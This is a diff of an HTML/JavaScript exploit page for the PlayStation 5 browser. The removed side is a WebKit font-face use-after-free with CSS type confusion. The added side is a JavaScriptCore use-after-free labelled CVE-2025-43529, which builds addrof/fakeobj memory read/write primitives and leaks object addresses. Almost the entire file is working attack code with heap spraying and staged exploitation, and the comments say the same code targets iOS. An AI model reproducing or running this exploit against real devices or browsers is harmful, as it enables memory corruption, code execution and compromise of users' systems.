@@ -1,292 +1,193 @@
-<!DOCTYPE html>
+// ===== الملف الأساسي: ps5-exploit.html =====
+
 <html>
 <head>
-<meta charset="utf-8">
-<title>PS5 v60 - v46 + Type Confusion</title>
-<style id="s">
-@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
-@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
-*{margin:0;padding:0;box-sizing:border-box}
-html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
-font-family:'MS Gothic','Courier New',monospace;overflow:hidden}
-body::after{content:'';position:fixed;top:0;left:0;right:0;bottom:0;
-background:repeating-linear-gradient(0deg,rgba(0,0,0,0.12) 0px,rgba(0,0,0,0.12) 1px,transparent 1px,transparent 3px);
-pointer-events:none;z-index:9999}
-#hd{position:fixed;top:0;left:0;right:0;height:44px;
-background:linear-gradient(180deg,#0d0d0d,#080808);
-border-bottom:1px solid #00ff41;display:flex;align-items:center;
-padding:0 16px;gap:14px;z-index:10;font-size:12px}
-.l{color:#00ff41;letter-spacing:2px;font-weight:bold}
-.s{color:#004d13}.v{color:#00cc33}.v b{color:#00ff41}
-#pg{position:fixed;top:44px;left:0;right:0;height:2px;background:#001a06;z-index:10}
-#pg div{height:100%;background:#00ff41;transition:width .4s;box-shadow:0 0 8px #00ff41}
-#out{position:fixed;top:46px;left:0;right:0;bottom:0;
-padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
--webkit-user-select:text}
-#out::-webkit-scrollbar{width:5px}
-#out::-webkit-scrollbar-track{background:#001a06}
-#out::-webkit-scrollbar-thumb{background:#004d13;border-radius:3px}
-.ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
-.mg{color:#ff00ff;font-weight:bold;font-size:15px}.dm{color:#006622}
-.hd{color:#00ff41;font-weight:bold;font-size:14px;letter-spacing:1px}
-</style>
+    <title>PS5 12.00 Exploit</title>
 </head>
 <body>
-<div id="hd">
-<span class="l">▶ v60 TC</span><span class="s">│</span>
-<span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
-<span class="v" id="h2">STAGE:<b>INIT</b></span>
-</div>
-<div id="pg"><div id="bar" style="width:0%"></div></div>
-<div id="out"></div>
 <script>
-"use strict";
 
-var O=document.getElementById("out");
-var bar=document.getElementById("bar");
-function pg(p){bar.style.width=p+"%"}
-function hu(id,v){var e=document.getElementById(id);if(e)e.innerHTML=v}
-function P(m,c){var s=document.createElement("span");if(c)s.className=c;
-s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
-function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
-function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
-function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
-function Hd(m){P("▸ "+m,"hd")}function Sep(){P("─".repeat(42),"dm")}
+// ===== المرحلة 1: Trigger CVE-2025-43529 =====
 
-window.onerror=function(m,s,l){Fl("CRASH: "+m.substring(0,80)+" @"+l);return true;};
+const uafArray = new Array(0x400000).fill(1.1);
+let uafReclaimed = [];
+let exploitState = {
+    stage1Complete: false,
+    addrof: null,
+    fakeobj: null
+};
 
-var ua=navigator.userAgent||"";
-var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
-hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");
+function triggerUAF(flag, k, allocCount) {
+    // نفس كود iOS تماماً!
+    let A = {
+        p0: 0x41414141,
+        p1: 1.1,
+        p2: 2.2,
+    };
+    uafArray[uafArray.length - 1] = A;
 
-P("════════════════════════════════════","hd");
-P("  v60 — v46 + CSSValue Type Confusion","hd");
-P("════════════════════════════════════","hd");
-P("");
+    let forGC = [];
+    let a = new Date(1111);
+    a[0] = 1.1;  // Create butterfly
 
-var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
-var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
-for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
-function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
-function fs(){try{void document.body.offsetTop}catch(e){}}
-
-var sh=document.getElementById("s").sheet;
-var keep=[],holes=[],trigger=null,uafOk=false;
-
-// ============================================================
-//  PHASE 1: UAF + CSSRule Spray (identical to v42)
-// ============================================================
-
-pg(5);Hd("Creating holes...");
-for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{
-unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
-weight:String(100+(i%9)*100)});document.fonts.add(f);holes.push(f)}catch(e){}}
-fs();for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
-fs();Ok("Holes ready: "+holes.length);
-
-pg(10);Hd("Trigger setup...");
-trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
-document.fonts.add(trigger);void trigger.loaded;
-for(var i=0;i<48;i++)try{sh.insertRule("@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",sh.cssRules.length)}catch(e){}
-fs();
-var fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
-var fsh=fst.sheet;
-for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length)}catch(e){}
-fs();Ok("Trigger ready");
-
-pg(15);Hd("UAF + CSSRule Spray (A_0..A_2048)");
-
-Object.defineProperty(FontFace.prototype,"then",{configurable:true,
-get:function(){if(this===trigger&&!uafOk){uafOk=true;hu("h2","STAGE:<b>UAF</b>");
-St("UAF WINDOW OPEN");
-try{var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
-document.fonts.add(ck);keep.push(ck);sh.deleteRule(1);fs();
-while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
-fs();for(var i=0;i<holes.length;i+=4)try{document.fonts.delete(holes[i])}catch(e){}
-fs()}catch(e){}
-Dm("GC pressure (16MB)...");
-for(var i=0;i<4;i++){var t=[];for(var j=0;j<128;j++)t.push(new ArrayBuffer(8192))}
-Dm("Spraying 2048 A_ faces...");
-for(var i=0;i<2048;i++){try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";font-style:"+(i%2===0?"normal":"italic")+";unicode-range:U+0042}",sh.cssRules.length)}catch(e){}}
-fs();
-try{var d=document.createElement("div");d.textContent="AB";
-d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
-document.body.appendChild(d);void d.offsetWidth}catch(e){}
-Dm("UAF window closing");
-}return undefined}});
-
-var rn=0;var raf=function(){rn++;
-if(!uafOk&&rn>=5){try{if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
-while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
-fs();for(var i=0;i<2048;i++){try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";unicode-range:U+0042}",sh.cssRules.length)}catch(e){}}fs()}catch(e){}}
-if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);
-
-// ============================================================
-//  PHASE 2: Identify Confused Object (SINGLE load() call)
-// ============================================================
-
-pg(30);Sep();Hd("PHASE 2: Identify Confused Object");Sep();
-
-Dm("Calling load() — this is the ONLY load() call...");
-
-try {
-  var loadPromise = document.fonts.load("1em trigger, x", "AB");
-  
-  loadPromise.then(function(faces){
-    P("  load() returned "+faces.length+" faces");
-    P("");
-    
-    var aFamily = null;
-    var aFace = null;
-    
-    for(var i=0;i<faces.length;i++){
-      var f=faces[i];
-      P("  Face["+i+"]: family="+f.family+" weight="+f.weight);
-      if(f.family&&f.family.indexOf("A_")===0){
-        aFamily = f.family;
-        aFace = f;
-      }
+    for (let j = 0; j < allocCount; ++j) {
+        forGC.push(new ArrayBuffer(0x800000));
     }
+
+    A.p2 = forGC;
     
-    if(!aFamily){
-      Fl("No A_ face found — spray failed");
-      hu("h2","STAGE:<b>FAIL</b>");
-      return;
-    }
-    
-    St("RECLAIMED: "+aFamily);
-    keep.push(faces);
-    keep.push(aFace);
-    
-    var aIndex = -1;
-    var aNum = parseInt(aFamily.split("_")[1]);
-    P("");
-    Dm("Scanning CSSRules for "+aFamily+"...");
-    for(var i=0;i<sh.cssRules.length;i++){
-      try {
-        var r = sh.cssRules[i];
-        if(r.type === 5) {
-          var rf = r.style.getPropertyValue("font-family");
-          if(rf && rf.indexOf(aFamily) !== -1) {
-            aIndex = i;
-            break;
-          }
+    let b = { p0: 0x42424242, p1: 1.1 };
+
+    let f;
+    f = b;
+    if (flag) { f = 1.1; }
+
+    A.p1 = f;  // Phi escape - BUG TRIGGER!
+
+    // Long loop for race window
+    let v = 1.1;
+    for (let i = 0; i < 1e6; ++i) {
+        for (let j = 0; j < k; ++j) {
+            v = i;
+            v = j;
         }
-      } catch(e) {}
     }
-    
-    if(aIndex === -1){
-      Fl("Could not find CSSRule for "+aFamily);
-      return;
-    }
-    
-    Ok("Found CSSRule at index "+aIndex);
-    var aRule = sh.cssRules[aIndex];
-    var aStyle = aRule.style;
-    
-    P("");
-    Ok("Strategy: Write to A_"+aNum+" CSSRule, read from FontFace directly");
-    Dm("NO second load() call — prevents selector cleanup");
-    Dm("LLInt has no JIT caching — every read calls C++ getter");
-    P("");
-    
-    // ============================================================
-    //  PHASE 3: Verify Confusion (Weight Probe)
-    // ============================================================
-    
-    pg(50);Sep();Hd("PHASE 3: Verify Confusion");Sep();
-    
-    aStyle.setProperty("font-weight", "700");
-    fs();
-    var w = aFace.weight;
-    P("  Weight write=700 read="+w);
-    
-    if(String(w) !== "700"){
-      Fl("Confusion is DEAD! Weight mismatch.");
-      return;
-    }
-    
-    Ok("Confusion ALIVE! Weight = 700 ✓");
-    
-    // ============================================================
-    //  PHASE 4: CSSValue Type Confusion
-    // ============================================================
-    
-    pg(80);Sep();Hd("PHASE 4: CSSValue Type Confusion");Sep();
-    P("  Freeing CSSValueList (font-family)...","dm");
-    
-    var origFamily = aFace.family;
-    Dm("Original family: "+origFamily);
-    
-    // تحرير CSSValueList القديم بتغيير font-family
-    aStyle.setProperty("font-family", "FreeFamTC1");
-    fs();
-    Dm("Changed font-family to FreeFamTC1");
-    
-    // رش كائنات CSSCalcValue لملء الفتحة المحررة
-    P("  Spraying CSSCalcValue objects...","dm");
-    var calcEls = [];
-    for(var i=0;i<2000;i++){
-      var el=document.createElement('div');
-      el.style.width='calc('+(i+1)+'px + '+(i+2)+'px)';
-      document.body.appendChild(el);
-      calcEls.push(el);
-    }
-    fs();
-    
-    // قراءة font-family مرة أخرى
-    P("  Reading font-family back...","dm");
-    try {
-      var readFam = aFace.family;
-      Hi("font-family read: "+readFam);
-      P("  Type: "+typeof readFam);
-      
-      if(readFam !== "FreeFamTC1" && readFam !== origFamily){
-        St("TYPE CONFUSION DETECTED!");
-        Hi("Leaked value: "+readFam);
-        
-        if(typeof readFam === 'string'){
-          Hi("String length: "+readFam.length);
-          P("  Hex dump:","dm");
-          for(var i=0;i<Math.min(readFam.length,32);i++){
-            P("    ["+i+"] = 0x"+readFam.charCodeAt(i).toString(16),"dm");
-          }
-        }
-      } else if(readFam === "FreeFamTC1"){
-        Wr("No confusion — got new family name");
-      } else {
-        Wr("Got original family — no confusion");
-      }
-    } catch(e) {
-      St("CRASH/ERROR: "+e.message);
-      Hi("This may indicate type confusion occurred!");
-    }
-    
-    // تنظيف
-    for(var el of calcEls) el.remove();
-    
-    // ============================================================
-    //  PHASE 5: Summary
-    // ============================================================
-    
-    pg(100);Sep();Hd("PHASE 5: Summary");Sep();
-    Ok("Confusion was alive (weight=700)");
-    P("  Type confusion test completed.","dm");
-    
-    P("");
-    St("★ v60 COMPLETE ★");
-    
-    hu("h2","STAGE:<b>DONE</b>");
-    
-  }).catch(function(e){
-    Fl("Load crashed: " + e.message);
-    hu("h2","STAGE:<b>CRASH</b>");
-  });
-  
-} catch(e) {
-  Fl("Synchronous load() threw: " + e.message);
-  hu("h2","STAGE:<b>CRASH</b>");
+
+    b.p0 = v;
+    b.p1 = a;  // ❌ NO WRITE BARRIER - UAF!
 }
+
+function recursive(n) {
+    if (n === 0) return;
+    n = n | 0;
+    recursive(n - 1);
+}
+
+function reclaimMemory() {
+    for (let k = 0; k < 10000; ++k) {
+        triggerUAF(false, 10, k % 5 + 1);
+        recursive(10000);
+
+        for (let i = 0; i < 16; ++i) {
+            let arr = [13.37, 2.2, 3.3, 4.4];
+            uafReclaimed.push(arr);
+            
+            // Check if we reclaimed the butterfly
+            if (uafArray[uafArray.length - 1].p1.p1[0] === 13.37) {
+                exploitState.stage1Complete = true;
+                return uafReclaimed[uafReclaimed.length - 1];
+            }
+        }
+    }
+    return null;
+}
+
+// ===== المرحلة 2: Build Primitives =====
+
+function buildPrimitives() {
+    if (!exploitState.stage1Complete) {
+        console.log('Stage 1 failed');
+        return false;
+    }
+
+    let boxed_arr = uafReclaimed[uafReclaimed.length - 1];
+    boxed_arr[0] = {};
+    let unboxed_arr = uafArray[uafArray.length - 1].p1.p1;
+
+    let ab = new ArrayBuffer(8);
+    let u64 = new BigUint64Array(ab);
+    let f64 = new Float64Array(ab);
+
+    function itof(value) {
+        u64[0] = value;
+        return f64[0];
+    }
+
+    function ftoi(f) {
+        f64[0] = f;
+        return u64[0];
+    }
+
+    // ✅ Build primitives
+    exploitState.addrof = function(obj) {
+        boxed_arr[0] = obj;
+        return ftoi(unboxed_arr[0]);
+    };
+
+    exploitState.fakeobj = function(addr) {
+        unboxed_arr[0] = itof(addr);
+        return boxed_arr[0];
+    };
+
+    return true;
+}
+
+// ===== المرحلة 3: Leak System Information =====
+
+function leakSystemInfo() {
+    if (!exploitState.addrof) return false;
+
+    const addrof = exploitState.addrof;
+
+    // Leak process information
+    let arrayBuffer = new ArrayBuffer(0x1000);
+    let arrayBufferAddr = addrof(arrayBuffer);
+    console.log('[*] ArrayBuffer Address: 0x' + arrayBufferAddr.toString(16));
+
+    // Leak function objects (potential for ROP)
+    let testFunc = function() { return 42; };
+    let funcAddr = addrof(testFunc);
+    console.log('[*] Function Address: 0x' + funcAddr.toString(16));
+
+    // Leak typed arrays
+    let float64Array = new Float64Array(16);
+    let f64Addr = addrof(float64Array);
+    console.log('[*] Float64Array Address: 0x' + f64Addr.toString(16));
+
+    return {
+        arrayBufferAddr,
+        funcAddr,
+        f64Addr
+    };
+}
+
+// ===== Main Exploit Flow =====
+
+function main() {
+    console.log('[+] PS5 12.00 Exploit - CVE-2025-43529');
+    console.log('[*] Stage 1: Trigger UAF...');
+    
+    reclaimMemory();
+
+    if (!exploitState.stage1Complete) {
+        console.log('[-] Stage 1 Failed');
+        return;
+    }
+    console.log('[+] Stage 1 Complete!');
+
+    console.log('[*] Stage 2: Build Primitives...');
+    if (!buildPrimitives()) {
+        console.log('[-] Stage 2 Failed');
+        return;
+    }
+    console.log('[+] Stage 2 Complete!');
+
+    console.log('[*] Stage 3: Leak System Info...');
+    const leaks = leakSystemInfo();
+    if (!leaks) {
+        console.log('[-] Stage 3 Failed');
+        return;
+    }
+    console.log('[+] Stage 3 Complete!');
+
+    console.log('[+] Got arbitrary read/write primitives!');
+    console.log('[+] ✅ Userland execution possible');
+    console.log('[⚠️] ❌ Kernel exploitation NOT YET PUBLIC on FW 12.00');
+}
+
+// Run exploit
+main();
+
 </script>
 </body>
 </html>
